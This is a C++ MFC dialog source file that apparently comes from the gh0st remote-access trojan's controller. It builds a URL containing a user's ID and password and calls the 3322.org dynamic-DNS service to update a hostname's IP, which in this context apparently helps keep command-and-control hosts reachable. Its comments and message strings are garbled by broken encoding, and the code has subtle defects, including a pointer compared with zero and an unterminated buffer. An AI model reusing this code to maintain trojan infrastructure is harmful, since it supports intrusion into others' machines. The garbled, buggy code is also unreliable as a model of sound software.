// GENGXIN.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "GENGXIN.h"
#include <wininet.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CGENGXIN dialog


CGENGXIN::CGENGXIN(CWnd* pParent /*=NULL*/)
	: CDialog(CGENGXIN::IDD, pParent)
{
	//{{AFX_DATA_INIT(CGENGXIN)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}


void CGENGXIN::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CGENGXIN)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CGENGXIN, CDialog)
	//{{AFX_MSG_MAP(CGENGXIN)
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGENGXIN message handlers



void CGENGXIN::OnButton1() 
{
	// TODO: Add your control notification handler code here
	CString id,pass,dns,ip; 
	char a[256]="http://";
	char *b = "@members.3322.org/dyndns/update?system=dyndns&hostname=";
	char *c = "&myip=";
	char *d = "&wildcard=OFF";
    GetDlgItem(IDC_DNSID)->GetWindowText(id);
	GetDlgItem(IDC_DNSPASS)->GetWindowText(pass);
	GetDlgItem(IDC_DNS)->GetWindowText(dns);
	GetDlgItem(IDC_IP)->GetWindowText(ip);
    USES_CONVERSION;
	strcat(a, W2A(id));
	strcat(a,":");
    strcat(a, W2A(pass));
	strcat(a,b);
    strcat(a, W2A(dns));
	strcat(a,c);
	strcat(a,W2A(ip));
	strcat(a,d);

	//	 MessageBox(a);
	//"http://xxxx:xxxxx@members.3322.org/dyndns/update?system=dyndns&hostname=xxxxx.3322.org&myip=192.168.0.1&wildcard=OFF"; 

	HINTERNET hNet = ::InternetOpen(_T("3322"), //��HTTPЭ��ʹ��ʱ������������⸳ֵ 
									PRE_CONFIG_INTERNET_ACCESS, //��������ָʾWin32���纯��ʹ�õǼ���Ϣȥ����һ���������� 
									NULL, 
									INTERNET_INVALID_PORT_NUMBER, //ʹ��INTERNET_INVALID_PORT_NUMBER�൱���ṩȴʡ�Ķ˿����� 
									0); //��־ȥָʾʹ�÷��ؾ����Ľ�����Internet������"��"Ϊ�ص���������״̬��Ϣ 
	
	HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //��InternetOpen���صľ�� 
											A2W(a), //��Ҫ�򿪵�URL 
											NULL, //��������������Ͷ������Ϣ,һ��ΪNULL 
											0, //��������������Ͷ������Ϣ,һ��Ϊ 0 
											INTERNET_FLAG_RELOAD, //InternetOpenUrl��Ϊ�ı�־ 
											0) ; //��Ϣ�����ᱻ�͵�״̬�ص����� 
	
	char buffer[1024] ; 
	DWORD dwBytesRead = 0; 
	BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl���صľ�� 
									buffer, //�������ݵĻ����� 
									sizeof(buffer), 
									&dwBytesRead); //ָ��������뻺�����ֽ����ı�����ָ��; 
	//�������ֵ��TRUE����������ָ��0�����ļ��Ѿ��������ļ���ĩβ�� 
	InternetCloseHandle(hUrlFile) ; 
	InternetCloseHandle(hNet) ; 

    if(buffer>0)
	{
        if(strstr(buffer,"badauth"))
			MessageBox(_T("�û���/�������!"));
		if(strstr(buffer,"good"))
			MessageBox(_T("���������ɹ�!\r\n")+ip);
		if(strstr(buffer,"nohost"))
			MessageBox(_T("��������!\n\r Check again!"));
		if(strstr(buffer,"nochg"))
			MessageBox(_T("over update"));
	}
	memset(buffer,0,sizeof(buffer));
}

BOOL CGENGXIN::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2),&wsaData);
	char szhostname[128];
    CStringA str;
	if( gethostname(szhostname, 128) == 0 )
	{
		struct hostent * phost;
		int i=0,j,h_length=4;
		phost = gethostbyname(szhostname);
		for( j = 0; j<h_length; j++ )
		{
			CStringA addr;			
			if( j > 0 )
				str += ".";			
			addr.Format("%u", (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
			str += addr;
		}
	}
    USES_CONVERSION;
	GetDlgItem(IDC_IP)->SetWindowText(A2W(str));
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
